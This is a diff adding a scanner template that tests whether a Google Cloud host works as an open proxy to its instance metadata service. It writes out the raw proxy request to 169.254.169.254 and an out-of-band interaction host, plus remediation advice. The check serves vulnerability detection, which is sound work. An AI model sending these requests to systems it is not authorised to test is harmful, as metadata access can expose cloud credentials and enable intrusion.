@@ -1,0 +1,46 @@
+id: metadata-service-gcp
+
+# This attack abuses a misconfigured proxy that allows access to the metadata
+# IP or a name which resolves to the IP. A standard proxy request is made to
+# the proxy using the full metadata URL, which the proxy will fulfill to its
+# own metadata service.
+#
+# The proxy may also be vulnerable to host/port enumeration on localhost or
+# inside the private network.
+info:
+  name: Google GCP Metadata Service Check
+  author: sullo
+  severity: critical
+  description: The Google cloud (GCP) host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
+  remediation: Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.
+  reference:
+    - https://cloud.google.com/compute/docs/metadata/default-metadata-values
+    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    max-request: 2
+  tags: exposure,config,google,gcp,proxy,misconfig,metadata
+
+http:
+  - raw:
+      - |+
+        GET http://{{hostval}}/computeMetadata/v1/project/ HTTP/1.1
+        Host: {{hostval}}
+        Metadata-Flavor: Google
+
+    payloads:
+      hostval:
+        - aws.oast.online
+        - 169.254.169.254
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "attributes/"
+
+# digest: 4a0a00473045022100b1826497b2bd96a52b296f4be8780cd3f16c8082b4c661edc67c2eea7ec87a2d022008e42eecdfa425df28fe4a437dc7a5c04c5d7aed67b580ddbd8ec7b11491404c:922c64590222798bb761d5b6d8e72950
